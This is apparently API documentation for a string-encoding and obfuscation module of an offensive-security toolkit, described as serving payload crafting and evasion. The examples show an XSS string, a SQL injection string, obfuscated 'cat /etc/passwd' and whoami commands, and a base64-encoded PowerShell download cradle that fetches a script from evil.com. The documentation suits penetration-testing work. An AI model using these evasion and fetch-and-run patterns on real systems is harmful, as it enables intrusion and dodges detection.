# String Utilities

String manipulation and encoding utilities for payload crafting.

## Module: `ofx.api.strings`

Provides string manipulation functions for offensive security operations.

## Functions

### encode_string

Encode strings in various formats.

```python
from ofx.api.strings import encode_string

# Base64
encoded = encode_string("payload", encoding="base64")
# Returns: "cGF5bG9hZA=="

# URL encoding
encoded = encode_string("param=value&test", encoding="url")
# Returns: "param%3Dvalue%26test"

# Hex encoding
encoded = encode_string("shell", encoding="hex")
# Returns: "7368656c6c"

# HTML entities
encoded = encode_string("<script>", encoding="html")
# Returns: "&lt;script&gt;"
```

**Parameters**:
- `text` (str): String to encode
- `encoding` (str): Encoding type

**Supported Encodings**:
- `base64` - Base64 encoding
- `url` - URL encoding
- `hex` - Hexadecimal
- `html` - HTML entities
- `unicode` - Unicode escapes
- `rot13` - ROT13 cipher

### decode_string

Decode encoded strings.

```python
from ofx.api.strings import decode_string

# Base64
decoded = decode_string("cGF5bG9hZA==", encoding="base64")
# Returns: "payload"

# URL decoding
decoded = decode_string("param%3Dvalue", encoding="url")

# Hex decoding
decoded = decode_string("7368656c6c", encoding="hex")
```

### obfuscate

Obfuscate strings for evasion.

```python
from ofx.api.strings import obfuscate

# PowerShell obfuscation
obfuscated = obfuscate(
    "Get-Process",
    method="powershell"
)

# Bash obfuscation
obfuscated = obfuscate(
    "cat /etc/passwd",
    method="bash"
)

# String concatenation
obfuscated = obfuscate(
    "malicious",
    method="concat"
)
# Returns: "mal"+"ici"+"ous"
```

**Methods**:
- `powershell` - PowerShell string obfuscation
- `bash` - Bash variable expansion
- `concat` - String concatenation
- `reverse` - Reverse and unreverse
- `charcode` - Character code conversion

### generate_random

Generate random strings.

```python
from ofx.api.strings import generate_random

# Random alphanumeric
random_str = generate_random(length=16)

# Random hex
hex_str = generate_random(length=32, charset="hex")

# Custom charset
custom = generate_random(length=10, charset="ABC123")
```

**Parameters**:
- `length` (int): String length
- `charset` (str): Character set (`alphanumeric`, `hex`, `alpha`, custom)

### escape_quotes

Escape quotes in strings.

```python
from ofx.api.strings import escape_quotes

# Escape single quotes
escaped = escape_quotes("It's working", quote="'")
# Returns: "It\\'s working"

# Escape  double quotes
escaped = escape_quotes('Say "Hello"', quote='"')
# Returns: 'Say \\"Hello\\"'
```

## Examples

### Payload Encoding

```python
from ofx.api.strings import encode_string

# XSS payload
xss = "<script>alert(1)</script>"

# HTML entity encoding
encoded = encode_string(xss, encoding="html")
# Use in HTML context

# URL encoding for parameter
url_safe = encode_string(xss, encoding="url")
# Use in URL parameter
```

### Command Obfuscation

```python
from ofx.api.strings import obfuscate

# Original command
cmd = "whoami"

# Obfuscate for bash
obfuscated = obfuscate(cmd, method="bash")
# Might generate: w\h\o\a\m\i or $(echo d2hvYW1p|base64 -d)

# Use in payload
payload = f"system('{obfuscated}')"
```

### SQLi Payload Crafting

```python
from ofx.api.strings import encode_string, obfuscate

# SQL injection payload
sqli = "' OR '1'='1"

# Hex encoding
hex_payload = encode_string(sqli, encoding="hex")

# Use in  SQL context
payload = f"0x{hex_payload}"
```

### PowerShell Evasion

```python
from ofx.api.strings import obfuscate, encode_string

# PowerShell download cradle
ps_cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"

# Base64 encode
b64 = encode_string(ps_cmd, encoding="base64")

# Obfuscate
obfuscated = obfuscate(ps_cmd, method="powershell")

# Execute
exec_cmd = f"powershell -enc {b64}"
```

## Use in Workflows

```yaml
name: payload-encoding
jobs:
  encode:
    steps:
      - name: Encode payload
        run: |
          python3 << 'EOF'
          from ofx.api.strings import encode_string
          
          payload = "${{ inputs.payload }}"
          encoded = encode_string(payload, encoding="base64")
          print(f"::set-output encoded={encoded}")
          EOF
```

## See Also

- [Exploitation API](../exploitation/index.md)
- [HTTP API](../exploitation/http.md)
- [Shellcode API](../exploitation/shellcode.md)
